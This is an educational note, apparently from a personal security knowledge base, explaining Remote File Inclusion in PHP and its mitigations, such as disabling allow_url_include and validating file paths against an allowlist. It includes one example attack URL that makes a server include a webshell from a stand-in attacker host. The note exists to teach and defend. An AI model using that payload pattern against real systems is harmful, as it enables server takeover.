# RFI

## What it is
Imagine a chef who, instead of cooking from their own recipe book, calls a random stranger's kitchen and asks them to cook the dish — then serves it to guests. Remote File Inclusion (RFI) is a web vulnerability where an attacker tricks a server into fetching and executing a malicious script hosted on an external, attacker-controlled URL, treating foreign code as trusted application logic.

## Why it matters
In 2011, attackers exploited RFI vulnerabilities in WordPress plugins to load remote PHP webshells, achieving full server compromise and turning thousands of sites into botnet nodes. Defenders mitigate this by disabling PHP's `allow_url_include` directive in `php.ini` and validating all file path inputs against a strict allowlist — never accepting raw user input as a file path.

## Key facts
- RFI requires `allow_url_include = On` in PHP configuration; this setting is **disabled by default** in PHP 5.2+ — making modern RFI less common but still viable in legacy systems
- The attacker hosts a malicious script (e.g., a PHP webshell) on an external server; the vulnerable application fetches and **executes** it server-side
- RFI differs from LFI (Local File Inclusion): RFI pulls code from **remote** URLs; LFI reads files already present on the local server
- Successful RFI leads to Remote Code Execution (RCE), enabling data exfiltration, privilege escalation, or full system takeover
- Common vulnerable parameter pattern: `index.php?page=http://evil.com/shell.php` — the `page` parameter is passed directly to an `include()` call without sanitization

## Related concepts
[[LFI]] [[Remote Code Execution]] [[Input Validation]] [[Web Application Firewall]] [[PHP Security]]